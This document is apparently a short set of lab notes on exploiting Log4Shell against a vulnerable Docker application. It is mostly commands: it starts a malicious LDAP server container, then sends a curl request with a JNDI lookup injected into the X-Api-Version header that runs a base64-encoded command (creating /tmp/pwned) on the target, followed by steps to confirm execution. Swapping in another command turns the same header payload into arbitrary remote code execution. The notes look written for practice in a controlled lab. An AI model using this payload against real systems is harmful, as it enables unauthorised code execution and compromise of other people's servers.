Steps:
- Connect to the machine
- Test the network connectivity before you move forward:
````
curl http://ipaddr:8080
````
- Set up the malicious LDAP server
	- Start a new screen session `screen -S ldap`
	````
	sudo docker run --name log4jldapserver -p 1389:1389 -p 8888:8888 ppfles/log4shell-ldap-server
	````
- Send the malicious payload:
````
curl ipaddr:8080 -H 'X-Api-Version: ${jndi:ldap://my_ip_addr:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZA==}'
````
NOTES:
- the -H option modifies one of the HTTP header files
- this specific application is logging the X-Api-Version field, so that's where you can inject the malicious code
- the string will start with jndi (Java Naming and Directory Interface). You are telling the app to use jndi, which then allows you to make a request with another protocol, in this case LDAP
- the /Basic/Coimmand/... is a base 64 command that is equal to `touch /tmp/pwned`

- Now cvheck the LDAP server to see its output. Connect back to that screen session with `screen -r ldap`
![[screen output.png]]
- Now, if you execute again the `sudo docker exec vulnapp2 ls /tmp` there must be a new file called pwned